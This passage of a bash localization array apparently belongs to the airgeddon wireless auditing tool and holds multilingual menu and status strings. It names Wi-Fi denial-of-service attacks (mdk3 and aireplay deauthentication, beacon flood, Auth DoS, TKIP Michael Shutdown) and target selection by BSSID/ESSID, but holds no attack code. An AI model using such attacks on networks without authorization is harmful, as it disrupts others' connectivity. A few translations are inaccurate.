	arr["GREEK",9]="Το σύστημα εντοπίζεται..."

	arr["ENGLISH",10]="This interface ${interface} is already in monitor mode"
	arr["SPANISH",10]="Esta interfaz ${interface} ya está en modo monitor"
	arr["FRENCH",10]="L'interface ${interface} est déjà en mode moniteur"
	arr["CATALAN",10]="Aquesta interfície ja està en mode monitor"
	arr["PORTUGUESE",10]="Esta interface ${interface} já está em modo monitor"
	arr["RUSSIAN",10]="Этот интерфейс ${interface} уже в режиме монитора"
	arr["GREEK",10]="Αυτή η διεπαφή ${interface} είναι ήδη σε κατάσταση παρακολούθησης"

	arr["ENGLISH",11]="Exiting airgeddon script v${airgeddon_version} - See you soon! :)"
	arr["SPANISH",11]="Saliendo de airgeddon script v${airgeddon_version} - Nos vemos pronto! :)"
	arr["FRENCH",11]="Fermeture du script airgeddon v${airgeddon_version} - A bientôt! :)"
	arr["CATALAN",11]="Sortint de airgeddon script v${airgeddon_version} - Ens veiem aviat! :)"
	arr["PORTUGUESE",11]="Saindo do script airgeddon  v${airgeddon_version} - Até breve! :)"
	arr["RUSSIAN",11]="Выход из скрипта airgeddon v${airgeddon_version} - До встречи! :)"
	arr["GREEK",11]="Κλείσιμο του airgeddon v${airgeddon_version} - Αντίο :)"

	arr["ENGLISH",12]="${blue_color}Interruption detected. ${green_color}Do you really want to exit? ${normal_color}[y/n]"
	arr["SPANISH",12]="${blue_color}Detectada interrupción. ${green_color}¿Quieres realmente salir del script? ${normal_color}[y/n]"
	arr["FRENCH",12]="${blue_color}Interruption détectée. ${green_color}Voulez-vous vraiment arrêter le script? ${normal_color}[y/n]"
	arr["CATALAN",12]="${blue_color}Interrupció detectada. ${green_color}¿Realment vols sortir de l'script? ${normal_color}[y/n]"
	arr["PORTUGUESE",12]="${blue_color}Interrupção detectada. ${green_color}Você quer realmente sair o script? ${normal_color}[y/n]"
	arr["RUSSIAN",12]="${blue_color}Обнаружено прерывание. ${green_color}Вы действительно хотите выйти? ${normal_color}[y/n]"
	arr["GREEK",12]="${blue_color}Εντοπίστηκε διακοπή. ${green_color}Είστε σίγουροι ότι θέλετε να τερματίσετε το script; ${normal_color}[y/n]"

	arr["ENGLISH",13]="This interface ${interface} is not a wifi card. It doesn't support monitor mode"
	arr["SPANISH",13]="Esta interfaz ${interface} no es una tarjeta wifi. No soporta modo monitor"
	arr["FRENCH",13]="L'interface ${interface} n'est pas une carte wifi. Elle n'est donc pas compatible mode moniteur"
	arr["CATALAN",13]="Aquesta interfície ${interface} no és una targeta wifi vàlida. No es compatible amb mode monitor"
	arr["PORTUGUESE",13]="Esta interface ${interface} não é wifi. Ela não suporta o modo monitor"
	arr["RUSSIAN",13]="Этот интерфейс ${interface} не является wifi картой. Он не поддерживает режим монитора"
	arr["GREEK",13]="Αυτή η διεπαφή ${interface} δεν έιναι κάρτα wifi. Δεν υποστηρίζει κατάσταση παρακολούθησης"

	arr["ENGLISH",14]="This interface ${interface} is not in monitor mode"
	arr["SPANISH",14]="Esta interfaz ${interface} no está en modo monitor"
	arr["FRENCH",14]="L'interface ${interface} n'est pas en mode moniteur"
	arr["CATALAN",14]="Aquesta interfície ${interface} no està en mode monitor"
	arr["PORTUGUESE",14]="Esta interface ${interface} não está em modo monitor"
	arr["RUSSIAN",14]="Этот интерфейс ${interface} не в режиме монитора"
	arr["GREEK",14]="Αυτή η διεπαφή ${interface} δεν είναι σε κατάσταση παρακολούθησης"

	arr["ENGLISH",15]="The interface changed its name while putting in managed mode. Autoselected"
	arr["SPANISH",15]="Esta interfaz ha cambiado su nombre al ponerse en modo managed. Se ha seleccionado automáticamente"
	arr["FRENCH",15]="Le nom de l'interface a changé lors du passage en mode managed. Elle a été sélectionnée automatiquement"
	arr["CATALAN",15]="Aquesta interfície ha canviat de nom al posar-la en mode managed. S'ha triat automàticament"
	arr["PORTUGUESE",15]="Esta interface mudou de nome, colocando em modo managed e selecionando automaticamente"
	arr["RUSSIAN",15]="Интерфейс изменил имя во время перевода в управляемый режим. Выбран автоматически"
	arr["GREEK",15]="Η διεπάφη άλλαξε όνομα καθώς ήταν σε ετερόκλητη κατάσταση. Επιλέχθηκε αυτόματα"

	arr["ENGLISH",16]="Managed mode now is set on ${interface}"
	arr["SPANISH",16]="Se ha puesto el modo managed en ${interface}"
	arr["FRENCH",16]="${interface} est maintenant en mode manged"
	arr["CATALAN",16]="${interface} s'ha configurat en mode managed"
	arr["PORTUGUESE",16]="Modo managed configurado em ${interface}"
	arr["RUSSIAN",16]="Управляемый режим теперь установлен на ${interface}"
	arr["GREEK",16]="Η διεπαφή ${interface} είναι τώρα σε ετερόκλητη κατάσταση"

	arr["ENGLISH",17]="Putting your interface in managed mode..."
	arr["SPANISH",17]="Poniendo la interfaz en modo managed..."
	arr["FRENCH",17]="L'interface est en train de passer en mode managed..."
	arr["CATALAN",17]="Configurant la interfície en mode managed..."
	arr["PORTUGUESE",17]="Colocando a interface em modo managed..."
	arr["RUSSIAN",17]="Переводим ваш интерфейс в управляемый режим..."
	arr["GREEK",17]="Ενεργοποιείται η ετερόκλητη κατάσταση στην διεπαφή..."

	arr["ENGLISH",18]="Putting your interface in monitor mode..."
	arr["SPANISH",18]="Poniendo la interfaz en modo monitor..."
	arr["FRENCH",18]="L'interface est en train de passer en mode moniteur..."
	arr["CATALAN",18]="Configurant la interfície en mode monitor..."
	arr["PORTUGUESE",18]="Colocando a interface em modo monitor..."
	arr["RUSSIAN",18]="Переводим ваш интерфейс в режим монитора..."
	arr["GREEK",18]="Ενεργοποιείται η κατάσταση παρακολούθησης στην διεπαφή..."

	arr["ENGLISH",19]="Please be patient. Maybe killing some conflicting processes..."
	arr["SPANISH",19]="Por favor ten paciencia. Puede que esté matando algunos procesos que podrían causar conflicto..."
	arr["FRENCH",19]="Soyez patients s'il vous plaît. Il se peut qu'il faile tuer des processus conflictuels..."
	arr["CATALAN",19]="Si us plau té paciència. Pot ser que s'estiguin matant alguns processos que podrien causar conflicte..."
	arr["PORTUGUESE",19]="Por favor, seja paciente. Matando alguns processos que podem causar conflitos..."
	arr["RUSSIAN",19]="Пожалуйста, будьте терпеливы. Возможно убийство некоторых конфликтующих процессов..."
	arr["GREEK",19]="Παρακαλώ δείξτε υπομονή. Ίσως τερματίζουν κάποιες εμπλέκουσες διεργασίες..."

	arr["ENGLISH",20]="This interface ${interface} doesn't support monitor mode"
	arr["SPANISH",20]="Esta interfaz ${interface} no soporta modo monitor"
	arr["FRENCH",20]="L'interface ${interface} n'est pas compatible mode moniteur"
	arr["CATALAN",20]="Aquesta interfície ${interface} no suporta mode monitor"
	arr["PORTUGUESE",20]="Esta interface ${interface} não suporta o modo monitor"
	arr["RUSSIAN",20]="Этот интерфейс ${interface} не поддерживает режим монитора"
	arr["GREEK",20]="Αυτή η διεπαφή ${interface} δεν υποστηρίζει κατάσταση παρακολούθησης"

	arr["ENGLISH",21]="The interface changed its name while putting in monitor mode. Autoselected"
	arr["SPANISH",21]="Esta interfaz ha cambiado su nombre al ponerla en modo monitor. Se ha seleccionado automáticamente"
	arr["FRENCH",21]="Le nom de l'interface à changé lors de l'activation du mode moniteur. Elle a été automatiquement sélectionnée"
	arr["CATALAN",21]="Aquesta interfície ha canviat de nom al posar-la en mode monitor. S'ha seleccionat automàticament"
	arr["PORTUGUESE",21]="Esta interface mudou de nome, colocando em modo monitor e selecionando automaticamente"
	arr["RUSSIAN",21]="Этот интерфейс изменил своё имя во время перевода в режим монитора. Выбран автоматически"
	arr["GREEK",21]="Η διεπαφή άλλαξε όνομα καθώς ήταν σε κατάσταση παρακολούθησης"

	arr["ENGLISH",22]="Monitor mode now is set on ${interface}"
	arr["SPANISH",22]="Se ha puesto el modo monitor en ${interface}"
	arr["FRENCH",22]="Mode moniteur activé sur l'interface ${interface}"
	arr["CATALAN",22]="S'ha configurat el mode monitor en ${interface}"
	arr["PORTUGUESE",22]="Modo monitor foi ativo em ${interface}"
	arr["RUSSIAN",22]="Режим монитора установлен на ${interface}"
	arr["GREEK",22]="Η διεπαφή ${interface} είναι τώρα σε κατάσταση παρακολούθησης"

	arr["ENGLISH",23]="There is a problem with the interface selected. Redirecting you to script exit"
	arr["SPANISH",23]="Hay un problema con la interfaz seleccionada. Redirigiendo a la salida del script"
	arr["FRENCH",23]="Il y a un problème avec l'interface choisie. Vous allez être dirigés vers la sortie du script"
	arr["CATALAN",23]="Hi ha un problema amb la interfície seleccionada. Redirigint cap a la sortida del script"
	arr["PORTUGUESE",23]="Existe um problema com a interface selecionada. Saindo do script"
	arr["RUSSIAN",23]="Проблема с выбранным интерфейсом. Перенаправляем вас к выходу из скрипта"
	arr["GREEK",23]="Υπάρχει πρόβλημε με την επιλεγμένη διεπαφή. Θα καθοδηγηθείτε στην έξοδο του script"

	arr["ENGLISH",24]="Select an interface to work with :"
	arr["SPANISH",24]="Selecciona una interfaz para trabajar con ella :"
	arr["FRENCH",24]="Sélectionnez l'interface pour travailler :"
	arr["CATALAN",24]="Seleccionar una interfície per treballar-hi :"
	arr["PORTUGUESE",24]="Seleccionar uma interface para trabalhar :"
	arr["RUSSIAN",24]="Выберите интерфейс для работы :"
	arr["GREEK",24]="Επιλέξτε διεπαφή :"

	arr["ENGLISH",25]="Set channel (1-14) :"
	arr["SPANISH",25]="Selecciona un canal (1-14) :"
	arr["FRENCH",25]="Sélectionnez un canal (1-14) :"
	arr["CATALAN",25]="Seleccioni un canal (1-14) :"
	arr["PORTUGUESE",25]="Escolha um canal (1-14) :"
	arr["RUSSIAN",25]="Установите канал (1-14) :"
	arr["GREEK",25]="Θέστε κανάλι (1-14) :"

	arr["ENGLISH",26]="Channel set to ${normal_color}${channel}"
	arr["SPANISH",26]="Canal elegido ${normal_color}${channel}"
	arr["FRENCH",26]="Le canal ${normal_color}${channel}${blue_color} a été choisi"
	arr["CATALAN",26]="El canal ${normal_color}${channel}${blue_color} s'ha escollit"
	arr["PORTUGUESE",26]="Canal ${normal_color}${channel}${blue_color} selecionado"
	arr["RUSSIAN",26]="Канал установлен на ${normal_color}${channel}"
	arr["GREEK",26]="Το κανάλι ${normal_color}${channel}${blue_color} έχει επιλεχθεί"

	arr["ENGLISH",27]="Type target BSSID (example: 00:11:22:33:44:55) :"
	arr["SPANISH",27]="Escribe el BSSID objetivo (ejemplo: 00:11:22:33:44:55) :"
	arr["FRENCH",27]="Veuillez entrer le BSSID de l'objectif (exemple: 00:11:22:33:44:55) :"
	arr["CATALAN",27]="Escriu el BSSID objectiu (exemple: 00:11:22:33:44:55) :"
	arr["PORTUGUESE",27]="Escreva o BSSID alvo (exemplo: 00:11:22:33:44:55) :"
	arr["RUSSIAN",27]="Тип целевой BSSID (пример: 00:11:22:33:44:55) :"
	arr["GREEK",27]="Πληκτρολογήστε BSSID στόχου (παράδειγμα: 00:11:22:33:44:55) :"

	arr["ENGLISH",28]="BSSID set to ${normal_color}${bssid}"
	arr["SPANISH",28]="BSSID elegido ${normal_color}${bssid}"
	arr["FRENCH",28]="Le BSSID choisi est ${normal_color}${bssid}"
	arr["CATALAN",28]="El BSSID escollit ${normal_color}${bssid}"
	arr["PORTUGUESE",28]="BSSID escolhido ${normal_color}${bssid}"
	arr["RUSSIAN",28]="BSSID установлена на ${normal_color}${bssid}"
	arr["GREEK",28]="Το BSSID τέθηκε σε ${normal_color}${bssid}"

	arr["ENGLISH",29]="Type target ESSID :"
	arr["SPANISH",29]="Escribe el ESSID objetivo :"
	arr["FRENCH",29]="Écrivez l'ESSID du réseau cible :"
	arr["CATALAN",29]="Escriu el ESSID objectiu :"
	arr["PORTUGUESE",29]="Escreva o ESSID do alvo :"
	arr["RUSSIAN",29]="Тип целевой ESSID :"
	arr["GREEK",29]="Πληκτρολογήστε ESSID στόχου :"

	arr["ENGLISH",30]="You have selected a hidden network ESSID. Can't be used. Select another one or perform a BSSID based attack instead of this"
	arr["SPANISH",30]="Has seleccionado un ESSID de red oculta. No se puede usar. Selecciona otro o ejecuta un ataque basado en BSSID en lugar de este"
	arr["FRENCH",30]="Vous avez choisi un réseau dont l'ESSID est caché et ce n'est pas possible. Veuillez sélectionner une autre cible ou bien effectuer une attaque qui se fonde sur le BSSID au lieu de celle-ci"
	arr["CATALAN",30]="Has seleccionat un ESSID de xarxa oculta. No es pot utilitzar. Selecciona un altre o executa un atac basat en BSSID en lloc d'aquest"
	arr["PORTUGUESE",30]="Você selecionou uma rede com ESSID oculto. Você não pode ultilizar. Selecione outro ou execute um ataque com BSSID ao invés deste"
	arr["RUSSIAN",30]="Вы выбрали сеть со скрытым ESSID. Использование невозможно. Выберите другую или вместо этой выполните атаку, основанную на BSSID"
	arr["GREEK",30]="Επιλέξατε ESSID κρυφού δικτύου. Δεν μπορεί να χρησιμοποιηθεί. Επιλέξτε κάποιο άλλο ή ξεκινήστε μία επίθεση βασισμένη στο BSSID αντί αυτού"

	arr["ENGLISH",31]="ESSID set to ${normal_color}${essid}"
	arr["SPANISH",31]="ESSID elegido ${normal_color}${essid}"
	arr["FRENCH",31]="l'ESSID sélectionné est ${normal_color}${essid}"
	arr["CATALAN",31]="l'ESSID seleccionat ${normal_color}${essid}"
	arr["PORTUGUESE",31]="ESSID escolhido ${normal_color}${essid}"
	arr["RUSSIAN",31]="ESSID установлена на ${normal_color}${essid}"
	arr["GREEK",31]="Το ESSID τέθηκε σε ${normal_color}${essid}"

	arr["ENGLISH",32]="All parameters set"
	arr["SPANISH",32]="Todos los parámetros están listos"
	arr["FRENCH",32]="Tous les paramètres sont correctement établis"
	arr["CATALAN",32]="Tots els paràmetres establerts"
	arr["PORTUGUESE",32]="Todos os parâmetros configurados"
	arr["RUSSIAN",32]="Все параметры установлены"
	arr["GREEK",32]="Έχουν τεθεί όλοι οι παράμετροι"

	arr["ENGLISH",33]="Starting attack. When started, press [Ctrl+C] to stop..."
	arr["SPANISH",33]="Comenzando ataque. Una vez empezado, pulse [Ctrl+C] para pararlo..."
	arr["FRENCH",33]="L'attaque est lancé. Pressez [Ctrl+C] pour l'arrêter..."
	arr["CATALAN",33]="Començant l'atac. Un cop començat, premeu [Ctrl+C] per aturar-lo..."
	arr["PORTUGUESE",33]="Começando ataque. Uma vez iniciado, pressione [Ctrl+C] para parar..."
	arr["RUSSIAN",33]="Начало атаки. Когда начнётся, нажмите [Ctrl+C] для остановки..."
	arr["GREEK",33]="Έναρξη επίθεσης. Όταν ξεκινήσει, πατήστε [Ctrl+C] για να σταματήσει..."

	arr["ENGLISH",34]="Selected interface ${interface} is in monitor mode. Attack can be performed"
	arr["SPANISH",34]="La interfaz seleccionado ${interface} está en modo monitor. El ataque se puede realizar"
	arr["FRENCH",34]="L'interface ${interface} qui a été sélectionnée est bien en mode moniteur. L'attaque peut être lancée"
	arr["CATALAN",34]="La interfície seleccionada ${interface} està configurada en mode monitor. L'atac es pot realitzar"
	arr["PORTUGUESE",34]="Interface selecionada ${interface} está em modo monitor. O ataque pode ser realizada"
	arr["RUSSIAN",34]="Выбранный интерфейс ${interface} в режиме монитора. Можно выполнить атаку"
	arr["GREEK",34]="Η επιλεγμένη διεπαφή ${interface} είναι σε κατάσταση παρακολούθησης. Μπορεί να γίνει επίθεση"

	arr["ENGLISH",35]="Deauthentication / Dissasociation mdk3 attack chosen (monitor mode needed)"
	arr["SPANISH",35]="Elegido ataque de Desautenticación / Desasociación mdk3 (modo monitor requerido)"
	arr["FRENCH",35]="L'attaque de Dés-authentification / Dissociation mdk3 a été choisie (mode moniteur nécessaire)"
	arr["CATALAN",35]="Seleccionat atac de Desautenticació / Dissociació mdk3 (es requereix mode monitor)"
	arr["PORTUGUESE",35]="Selecionar ataque de desautenticação com mdk3 (modo monitor obrigatório)"
	arr["RUSSIAN",35]="Выбрана mdk3 атака Деаутентификации / Разъединения (необходим режим монитора)"
	arr["GREEK",35]="Deauthentication / Έχει επιλεχθεί επίθεση dissasociation mdk3 (χρειάζεται η κατάσταση παρακολούθησης)"

	arr["ENGLISH",36]="Deauthentication aireplay attack chosen (monitor mode needed)"
	arr["SPANISH",36]="Elegido ataque de Desautenticación aireplay (modo monitor requerido)"
	arr["FRENCH",36]="L'attaque de Dés-authentification aireplay a été choisie (mode moniteur nécessaire)"
	arr["CATALAN",36]="Seleccionat atac de Desautenticació aireplay (es requereix mode monitor)"
	arr["PORTUGUESE",36]="Selecionar ataque de desautenticação com Aireplay (modo monitor obrigatório)"
	arr["RUSSIAN",36]="Выбрана aireplay атака Деаутентификации (необходим режим монитора)"
	arr["GREEK",36]="Έχει επιλεχθεί επίθεση deauthentication aireplay (χρειάζεται η κατάσταση παρακολούθησης)"

	arr["ENGLISH",37]="WIDS / WIPS / WDS Confusion attack chosen (monitor mode needed)"
	arr["SPANISH",37]="Elegido ataque Confusion WIDS / WIPS / WDS (modo monitor requerido)"
	arr["FRENCH",37]="L'attaque Confusion WIDS / WIPS / WDS a été choisie (mode moniteur nécessaire)"
	arr["CATALAN",37]="Seleccionat atac Confusion WIDS /WIPS / WDS (es requereix mode monitor)"
	arr["PORTUGUESE",37]="Selcionar ataque Confusion WIDS / WIPS / WDS (modo monitor obrigatório)"
	arr["RUSSIAN",37]="Выбрана атака запутывания WIDS / WIPS / WDS (необходим режим монитора)"
	arr["GREEK",37]="Έχει επιλεχθεί επίθεση σύγχυσης WIDS / WIPS / WDS (χρειάζεται η κατάσταση παρακολούθησης)"

	arr["ENGLISH",38]="Beacon flood attack chosen (monitor mode needed)"
	arr["SPANISH",38]="Elegido ataque Beacon flood (modo monitor requerido)"
	arr["FRENCH",38]="L'attaque Beacon flood a été choisie (mode moniteur nécessaire)"
	arr["CATALAN",38]="Seleccionat atac Beacon flood (es requereix mode monitor)"
	arr["PORTUGUESE",38]="Selecionar ataque de Beacon flood (modo monitor obrigatório)"
	arr["RUSSIAN",38]="Выбрана атака флуда маяками (необходим режим монитора)"
	arr["GREEK",38]="Έχει επιλεχθεί επίθεση πλημμύρας φάρου (χρειάζεται η κατάσταση παρακολούθησης)"

	arr["ENGLISH",39]="Auth DoS attack chosen (monitor mode needed)"
	arr["SPANISH",39]="Elegido ataque Auth DoS (modo monitor requerido)"
	arr["FRENCH",39]="L'attaque Auth DoS a été choisie (modo moniteur nécessaire)"
	arr["CATALAN",39]="Seleccionat atac Auth DoS (es requereix mode monitor)"
	arr["PORTUGUESE",39]="Selecionar ataque DoS (modo monitor obrigatório)"
	arr["RUSSIAN",39]="Выбрана атака Auth DoS (необходим режим монитора)"
	arr["GREEK",39]="Έχει επιλεχθεί επίθεση Auth DoS (χρειάζεται η κατάσταση παρακολούθησης)"

	arr["ENGLISH",40]="Michael Shutdown (TKIP) attack chosen (monitor mode needed)"
	arr["SPANISH",40]="Elegido ataque Michael Shutdown (TKIP) (modo monitor requerido)"
	arr["FRENCH",40]="L'attaque Michael Shutdown (TKIP) a été choisie (mode moniteur nécessaire)"
	arr["CATALAN",40]="Seleccionat atac Michael Shutdown (TKIP) (es requereix mode monitor)"
	arr["PORTUGUESE",40]="Ataque selecionado Michael Shutdown (TKIP) (modo monitor obrigatório)"
	arr["RUSSIAN",40]="Выбрана атака Michael Shutdown (TKIP) (необходим режим монитора)"
	arr["GREEK",40]="Έχει επιλεχθεί επίθεση Michael Shutdown (TKIP) (χρειάζεται η κατάσταση παρακολούθησης)"

	arr["ENGLISH",41]="No interface selected. You'll be redirected to select one"
	arr["SPANISH",41]="No hay interfaz seleccionada. Serás redirigido para seleccionar una"
	arr["FRENCH",41]="Aucune interface sélectionnée. Vous allez retourner au menu de sélection pour en choisir une"
	arr["CATALAN",41]="No hi ha intefície seleccionada. Seràs redirigit per seleccionar una"
	arr["PORTUGUESE",41]="Nenhuma interface selecionada. Você será redirecionado para selecionar uma"
	arr["RUSSIAN",41]="Интерфейс не выбран. Вы будете перенаправлены на выбор интерфейса"
	arr["GREEK",41]="Δεν έχει επιλεχθεί κάποια διεπαφή. Θα καθοδηγηθείτε για να επιλέξετε μία"

	arr["ENGLISH",42]="Interface ${pink_color}${interface}${blue_color} selected. Mode: ${pink_color}${ifacemode}${normal_color}"
	arr["SPANISH",42]="Interfaz ${pink_color}${interface}${blue_color} seleccionada. Modo: ${pink_color}${ifacemode}${normal_color}"
	arr["FRENCH",42]="Interface ${pink_color}${interface}${blue_color} sélectionnée. Mode: ${pink_color}${ifacemode}${normal_color}"
	arr["CATALAN",42]="Interfície ${pink_color}${interface}${blue_color} seleccionada. Mode: ${pink_color}${ifacemode}${normal_color}"
	arr["PORTUGUESE",42]="Interface ${pink_color}${interface}${blue_color} selecionada. Modo: ${pink_color}${ifacemode}${normal_color}"
	arr["RUSSIAN",42]="Интерфейс ${pink_color}${interface}${blue_color} выбран. Режим: ${pink_color}${ifacemode}${normal_color}"
	arr["GREEK",42]="Η διεπαφή ${pink_color}${interface}${blue_color} έχει επιλεχθεί. Κατάσταση: ${pink_color}${ifacemode}${normal_color}"

	arr["ENGLISH",43]="Selected BSSID: ${pink_color}${bssid}${normal_color}"
	arr["SPANISH",43]="BSSID seleccionado: ${pink_color}${bssid}${normal_color}"
	arr["FRENCH",43]="BSSID sélectionné: ${pink_color}${bssid}${normal_color}"
	arr["CATALAN",43]="BSSID seleccionat: ${pink_color}${bssid}${normal_color}"
	arr["PORTUGUESE",43]="BSSID selecionado: ${pink_color}${bssid}${normal_color}"
	arr["RUSSIAN",43]="Выбранный BSSID: ${pink_color}${bssid}${normal_color}"
	arr["GREEK",43]="Επιλεγμένο BSSID: ${pink_color}${bssid}${normal_color}"

	arr["ENGLISH",44]="Selected channel: ${pink_color}${channel}${normal_color}"
	arr["SPANISH",44]="Canal seleccionado: ${pink_color}${channel}${normal_color}"
	arr["FRENCH",44]="Canal sélectionné: ${pink_color}${channel}${normal_color}"
	arr["CATALAN",44]="Canal seleecionat: ${pink_color}${channel}${normal_color}"
	arr["PORTUGUESE",44]="Canal selecionado: ${pink_color}${channel}${normal_color}"
	arr["RUSSIAN",44]="Выбранный канал: ${pink_color}${channel}${normal_color}"
	arr["GREEK",44]="Επιλεγμένο κανάλι: ${pink_color}${channel}${normal_color}"

	arr["ENGLISH",45]="Selected ESSID: ${pink_color}${essid}${blue_color} <- can't be used"
	arr["SPANISH",45]="ESSID seleccionado: ${pink_color}${essid}${blue_color} <- no se puede usar"
	arr["FRENCH",45]="ESSID sélectionné: ${pink_color}${essid}${blue_color} <- ne peut pas être utilisé"
	arr["CATALAN",45]="ESSID seleccionat: ${pink_color}${essid}${blue_color} <- no es pot utilitzar"
	arr["PORTUGUESE",45]="ESSID selecionado: ${pink_color}${essid}${blue_color} <- não pode ser utilizada"
	arr["RUSSIAN",45]="Выбранный ESSID: ${pink_color}${essid}${blue_color} <- не может быть использован"
	arr["GREEK",45]="Επιλεγμένο ESSID: ${pink_color}${essid}${blue_color} <- δεν μπορεί να χρησιμοποιηθεί"

	arr["ENGLISH",46]="Selected ESSID: ${pink_color}${essid}${normal_color}"
	arr["SPANISH",46]="ESSID seleccionado: ${pink_color}${essid}${normal_color}"
	arr["FRENCH",46]="ESSID sélectionné: ${pink_color}${essid}${normal_color}"
	arr["CATALAN",46]="ESSID seleccionat: ${pink_color}${essid}${normal_color}"
	arr["PORTUGUESE",46]="ESSID selecionado: ${pink_color}${essid}${normal_color}"
	arr["RUSSIAN",46]="Выбранный ESSID: ${pink_color}${essid}${normal_color}"
	arr["GREEK",46]="Επιλεγμένο ESSID: ${pink_color}${essid}${normal_color}"

	arr["ENGLISH",47]="Select an option from menu :"
	arr["SPANISH",47]="Selecciona una opción del menú :"
	arr["FRENCH",47]="Choisissez une des options du menu :"
	arr["CATALAN",47]="Selecciona una opció del menú :"
	arr["PORTUGUESE",47]="Selecione uma opção no menu :"
	arr["RUSSIAN",47]="Выбор опции из меню :"
	arr["GREEK",47]="Επιλέξτε μία επιλογή από το μενού :"

	arr["ENGLISH",48]="1.  Select another network interface"
	arr["SPANISH",48]="1.  Selecciona otra interfaz de red"
	arr["FRENCH",48]="1.  Sélectionnez une autre interface réseaux"
	arr["CATALAN",48]="1.  Selecciona una altre interfície de xarxa"
	arr["PORTUGUESE",48]="1.  Selecione outra interface de rede"
	arr["RUSSIAN",48]="1.  Выбрать другой сетевой интерфейс"
	arr["GREEK",48]="1.  Επιλογή διαφορετικής διεπαφής"

	arr["ENGLISH",49]="4.  Explore for targets (monitor mode needed)"
	arr["SPANISH",49]="4.  Explorar para buscar objetivos (modo monitor requerido)"
	arr["FRENCH",49]="4.  Détection des réseaux pour choisir une cible (modo moniteur obligatoire)"
	arr["CATALAN",49]="4.  Explorar per buscar objectius (es requereix mode monitor)"
	arr["PORTUGUESE",49]="4.  Procurar objetivos (modo monitor obrigatório)"
	arr["RUSSIAN",49]="4.  Поиск целей (необходим режим монитора)"
	arr["GREEK",49]="4.  Εξερεύνηση στόχων (χρειάζεται η κατάσταση παρακολούθησης)"

	arr["ENGLISH",50]="monitor mode needed for attacks"
	arr["SPANISH",50]="modo monitor requerido en ataques"
	arr["FRENCH",50]="modo moniteur obligatoire pour ces attaques"
	arr["CATALAN",50]="mode monitor requerit per atacs"
	arr["PORTUGUESE",50]="modo monitor necessário para ataques"
	arr["RUSSIAN",50]="для атак необходим режим монитора"
	arr["GREEK",50]="χρειάζεται η κατάσταση παρακολούθησης για τις επιθέσεις"

	arr["ENGLISH",51]="5.  Deauth / disassoc amok mdk3 attack"
	arr["SPANISH",51]="5.  Ataque Deauth / Disassoc amok mdk3"
	arr["FRENCH",51]="5.  Attaque Deauth / Disassoc amok mdk3"
	arr["CATALAN",51]="5.  Atac Death /Disassoc amok mdk3"
	arr["PORTUGUESE",51]="5.  Ataque Deauth / Disassoc amok mdk3"
	arr["RUSSIAN",51]="5.  Атака деаутентификации / разъединения amok mdk3"
	arr["GREEK",51]="5.  Επίθεση Deauth / Disassoc amok mdk3"

	arr["ENGLISH",52]="6.  Deauth aireplay attack"
	arr["SPANISH",52]="6.  Ataque Deauth aireplay"
	arr["FRENCH",52]="6.  Attaque Deauth aireplay"
	arr["CATALAN",52]="6.  Atac Deauth aireplay"
	arr["PORTUGUESE",52]="6.  Ataque Deauth aireplay"
	arr["RUSSIAN",52]="6.  Атака деаутентификации aireplay"
	arr["GREEK",52]="6.  Επίθεση Deauth aireplay"

	arr["ENGLISH",53]="7.  WIDS / WIPS / WDS Confusion attack"
	arr["SPANISH",53]="7.  Ataque WIDS / WIPS / WDS Confusion"
	arr["FRENCH",53]="7.  Attaque WIDS / WIPS / WDS Confusion"
	arr["CATALAN",53]="7.  Atac WIDS / WIPS / WDS Confusion"
	arr["PORTUGUESE",53]="7.  Ataque Confusion WIDS / WIPS / WDS"
	arr["RUSSIAN",53]="7.  Атака смешения WIDS / WIPS / WDS"
	arr["GREEK",53]="7.  Επίθεση σύγχυσης WIDS / WIPS / WDS"

	arr["ENGLISH",54]="old \"obsolete/non very effective\" attacks"
	arr["SPANISH",54]="antiguos ataques \"obsoletos/no muy efectivos\""
	arr["FRENCH",54]="anciennes attaques \"obsolètes/peu efficaces\""
	arr["CATALAN",54]="antics atacs \"obsolets/no gaire efectius\""
	arr["PORTUGUESE",54]="ataques antigos \"obsoletos/não muito eficazes\""
	arr["RUSSIAN",54]="старые \"абсолютно/не очень эффективные\" атаки"
	arr["GREEK",54]="παλιές \"απαρχαιωμένες/όχι και τόσο αποδοτικές\" επιθέσεις"

	arr["ENGLISH",55]="2.  Put interface in monitor mode"
	arr["SPANISH",55]="2.  Poner la interfaz en modo monitor"
	arr["FRENCH",55]="2.  Passer l'interface en mode moniteur"
	arr["CATALAN",55]="2.  Configurar la interfície en mode monitor"
	arr["PORTUGUESE",55]="2.  Colocar a interface em modo monitor"
	arr["RUSSIAN",55]="2.  Перевести интерфейс в режим монитора"
	arr["GREEK",55]="2.  Βάλτε τη διεπαφή σε κατάσταση παρακολούθησης"

	arr["ENGLISH",56]="3.  Put interface in managed mode"
	arr["SPANISH",56]="3.  Poner la interfaz en modo managed"
	arr["FRENCH",56]="3.  Passer l'interface en mode managed"
	arr["CATALAN",56]="3.  Configurar la interfície en mode managed"
	arr["PORTUGUESE",56]="3.  Colocar a interface em modo managed"
	arr["RUSSIAN",56]="3.  Перевести интерфейс в управляемый режим"
	arr["GREEK",56]="3.  Βάλτε τη διεπαφή σε ετερόκλητη κατάσταση"

	arr["ENGLISH",57]="6.  Put interface in monitor mode"
	arr["SPANISH",57]="6.  Poner el interfaz en modo monitor"
	arr["FRENCH",57]="6.  Passer l'interface en mode moniteur"
	arr["CATALAN",57]="6.  Configurar la interfície en mode monitor"
	arr["PORTUGUESE",57]="6.  Coloque a interface em modo monitor"
	arr["RUSSIAN",57]="6.  Перевести интерфейс в режим монитора"
	arr["GREEK",57]="6.  Βάλτε τη διεπαφή σε κατάσταση παρακολούθησης"

	arr["ENGLISH",58]="7.  Put interface in managed mode"
	arr["SPANISH",58]="7.  Poner el interfaz en modo managed"
	arr["FRENCH",58]="7.  Passer l'interface en mode managed"
	arr["CATALAN",58]="7.  Configurar la interfície en mode managed"
	arr["PORTUGUESE",58]="7.  Coloque a interface em modo managed"
	arr["RUSSIAN",58]="7.  Перевести интерфейс в управляемый режим"
	arr["GREEK",58]="7.  Βάλτε τη διεπαφή σε ετερόκλητη κατάσταση"

	arr["ENGLISH",59]="11. Return to main menu"
	arr["SPANISH",59]="11. Volver al menú principal"
	arr["FRENCH",59]="11. Retourner au menu principal"
	arr["CATALAN",59]="11. Tornar al menú principal"
	arr["PORTUGUESE",59]="11. Voltar ao menu principal"
	arr["RUSSIAN",59]="11. Вернуться в главное меню"
	arr["GREEK",59]="11. Επιστροφή στο αρχικό μενού"

	arr["ENGLISH",60]="9.  About & Credits"
	arr["SPANISH",60]="9.  Acerca de & Créditos"
	arr["FRENCH",60]="9.  A propos de & Crédits"
